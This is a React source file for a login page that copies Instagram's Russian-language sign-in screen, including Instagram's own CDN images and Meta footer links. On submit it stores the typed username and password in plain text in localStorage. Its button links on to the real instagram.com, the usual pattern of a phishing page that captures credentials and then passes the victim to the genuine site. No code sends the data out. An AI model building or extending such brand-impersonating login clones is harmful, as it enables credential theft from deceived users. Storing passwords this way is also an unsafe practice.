import React, { useState } from "react";
import Input from "../../components/input/Input";
import Preloader from "../../components/preloader/Preloader";
import styles from "../loginPage/LoginPage.module.css";

function LoginPage() {


  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleUsernameChange = (event) => {
    setUsername(event.target.value);
  };

  const handlePasswordChange = (event) => {
    setPassword(event.target.value);
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    setIsLoading(true);


    // Save the user's login data to local storage
    localStorage.setItem("username", username);
    localStorage.setItem("password", password);

    // Simulate a server response with a delay
    setTimeout(() => {
      setIsLoading(false);
    }, 2000);
  };
  const userData = [username, password];


  return (
    <div className="wrapper">
      <form className={styles.form} onSubmit={handleSubmit} >
        <div className={styles.insta}></div>
        <Input
          type="text"
          placeholder="Телефон, имя пользователя или эл. адрес"
          value={username}
          onChange={handleUsernameChange}
        />
        <Input
          type="password"
          placeholder="Пароль"
          value={password}
          onChange={handlePasswordChange}
        />

        <button type="submit" id="submit" className="btn" >
          <a href="https://instagram.com" id="a123"> Войти</a>
        </button>
        <div className="container">
          <hr />
          <p>ИЛИ</p>
          <hr />
        </div>
        <div className="container4">
          <img src="https://img.icons8.com/fluency/512/facebook.png" alt="" width='25px' height='25px' />
          <p>Войти через Facebook</p>
        </div>

        <a href="https://www.instagram.com/" >Забыли пароль?</a>
      </form>
      <div className="container3">
        <p>
          У вас ещё нет аккаунта?<a href="">Зарегестрироваться</a>
        </p>
      </div>
      <p className="downl"> Установите приложение.</p>
      <div className="imagesicon">
        <img src="https://static.cdninstagram.com/rsrc.php/v3/y9/r/E_2mQvC3HG-.png" alt="" className="google" width='140px' />
        <img src="https://static.cdninstagram.com/rsrc.php/v3/yr/r/fDjwyLC88oO.png" alt="" className="appstore" width='140px' />
      </div>
      <div className="end">
        <a href="">Meta</a>
        <a href="">Информация</a>
        <a href="">Блог</a>
        <a href="">Вакансии</a>
        <a href="">Помощь</a>
        <a href="">API</a>
        <br />
        <a href="">Конфиденциальность</a>
        <a href="">Условия</a>
        <a href="">Популярные аккаунты</a>
        <a href="">Места</a>
        <br />
        <a href="">Instagram Lite</a>
        <br />
        <a href="">Загрузка контактов и лица, не являющиеся пользователями</a>
        <br />
        <a href="">Meta Verified</a>
        <br />
        <div className="copyright">
          <a href="">© 2023 Instagram from Meta</a>
        </div>
      </div>

    </div>
  );
}

export default LoginPage;